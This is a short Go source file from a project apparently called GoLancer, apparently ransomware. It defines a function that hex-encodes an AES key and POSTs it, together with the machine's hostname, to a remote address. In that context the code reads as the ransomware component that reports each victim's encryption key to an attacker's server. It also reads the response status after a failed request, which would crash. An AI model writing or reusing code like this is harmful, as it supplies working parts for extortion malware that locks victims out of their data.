package webhelper

import (
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"net/url"

	"github.com/WesEfird/GoLancer/sysinfo"
)

func SendKey(aesKey []byte, addr string) {
	encodedBytes := hex.EncodeToString(aesKey)

	data := url.Values{
		"host": {sysinfo.GetInfo().Hostname},
		"key":  {encodedBytes},
	}

	resp, err := http.PostForm(addr, data)
	if err != nil {
		log.Println(err)
	}

	fmt.Println(resp.Status)

}
